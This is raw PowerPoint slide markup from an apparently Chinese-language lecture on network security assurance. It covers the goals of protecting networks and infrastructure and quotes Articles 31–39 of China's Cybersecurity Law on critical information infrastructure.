                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="39" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="95235">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5235">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>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5235">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9523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5235">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>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53" presetClass="entr" presetSubtype="16" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="48" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="49" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="5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build="p"/>
      <p:bldP spid="2" grpId="0"/>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619672" y="1628800"/>
            <a:ext cx="5425490" cy="4370534"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="358823" y="729186"/>
            <a:ext cx="3788217" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>保护区域边界</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>示例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2610425633"/>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899592" y="1412776"/>
            <a:ext cx="7344816" cy="4379173"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356682" y="794353"/>
            <a:ext cx="3788217" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>保护区域边界</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>示例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="393108456"/>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535918" y="656896"/>
            <a:ext cx="7310164" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>技术焦点领域</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：保护网络和基础设施</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96259" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="619248" y="1301345"/>
            <a:ext cx="8191500" cy="2061592"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>目标：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>网络和支持它的基础设施必须</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>防止数据非法泄露</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>防止受到拒绝服务的攻击</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>防止受到保护的信息在发送过程中的时延、误传或未发送。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="3402860"/>
            <a:ext cx="7344816" cy="1852815"/>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solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>方法：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>骨干网可用性</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>无线网络安全框架</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>系统高度互联和虚拟专用网</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>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0072" y="3717032"/>
            <a:ext cx="3779735" cy="2387525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13530105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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="962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625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6259">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9625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625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6259">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9625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625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6259">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9625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625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6259">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9625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62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3563888" y="1700808"/>
            <a:ext cx="4896544" cy="4154984"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十一条</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t> 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十二条 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十三条</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十四条</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（三）对重要系统和数据库进行容灾备份；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（四）制定网络安全事件应急预案，并定期进行演练；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（五）法律、行政法规规定的其他义务。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十五条 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十六条</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十七条 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十八条</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第三十九条</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
              <a:t>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="836712"/>
            <a:ext cx="5134739" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络安全法</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>与关键基础设施保护</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>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1772816"/>
            <a:ext cx="2787774" cy="1548763"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2157350971"/>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533400" y="686032"/>
            <a:ext cx="7200800" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>技术焦点领域</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：支撑性基础设施建设</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97283" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1295400"/>
            <a:ext cx="8191500" cy="1701552"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>目标：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>为安全保障服务提供一套相互关联的活动与基础设施</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
